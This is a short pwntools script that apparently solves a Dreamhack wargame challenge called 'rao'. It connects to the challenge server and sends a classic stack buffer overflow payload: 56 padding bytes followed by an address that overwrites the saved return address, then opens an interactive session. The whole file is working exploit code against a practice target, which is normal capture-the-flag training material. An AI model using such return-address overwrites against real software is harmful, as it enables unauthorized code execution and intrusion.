from pwn import *

# r = process('./rao')
r = remote('host3.dreamhack.games', 8336)

payload = b'A' * 56 + p64(0x4006aa)

r.sendlineafter('Input: ', payload)

r.interactive()
